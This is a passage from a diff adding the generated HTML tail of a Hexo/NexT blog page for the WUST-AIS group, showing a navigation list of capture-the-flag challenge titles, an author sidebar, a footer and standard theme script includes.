class="nav-link" href="#0x02-joke"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 . joke</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-base64"><span class="nav-number">4.1.</span> <span class="nav-text">0x00 . base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-兔老大"><span class="nav-number">4.2.</span> <span class="nav-text">0x01 . 兔老大</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-easy-caesar"><span class="nav-number">4.3.</span> <span class="nav-text">0x02.easy_caesar</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Where-am-I"><span class="nav-number">5.1.</span> <span class="nav-text">0x00 . Where_am_I</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-古老的计算机"><span class="nav-number">5.2.</span> <span class="nav-text">0x01 . 古老的计算机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-double-flag"><span class="nav-number">5.3.</span> <span class="nav-text">0x02.double_flag</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WUST-AIS"
+      src="/uploads/logo.png">
+  <p class="site-author-name" itemprop="name">WUST-AIS</p>
+  <div class="site-description" itemprop="description">Join us</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wust-ais" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wust-ais" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:no-reply-wais@foxmail.com" title="E-Mail → mailto:no-reply-wais@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WUST-AIS</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
